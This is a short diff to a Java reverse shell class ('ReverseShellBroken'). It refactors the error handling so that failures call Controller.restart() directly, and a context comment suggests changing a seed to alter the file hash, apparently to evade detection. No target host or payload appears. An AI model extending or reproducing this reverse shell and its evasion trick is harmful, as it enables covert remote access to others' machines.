@@ -9,6 +9,8 @@ import java.net.Socket;
 import java.net.SocketTimeoutException;
 import java.util.Arrays;
 
+import controller.Controller;
+
 public class ReverseShellBroken {
  
  // NOTE: Change seed to help you change the file hash.
@@ -36,12 +38,7 @@ public class ReverseShellBroken {
      } else {
          detected   = false;
          System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
-         try {
-			controller.Controller.restart();
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
+         Controller.restart();
      }
      return detected;
  }
@@ -76,12 +73,7 @@ public class ReverseShellBroken {
      } catch (SocketTimeoutException ex) {} catch (IOException ex) {
          this.error = true;
          System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
-         try {
-			controller.Controller.restart();
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
+         Controller.restart();
      }
  }
  
@@ -133,12 +125,7 @@ public class ReverseShellBroken {
              if (client != null) { try { client.close(); } catch (IOException ex) {} }
              
              if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
-             try {
-				controller.Controller.restart();
-			} catch (Exception e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
+            Controller.restart();
          }
      }
  }
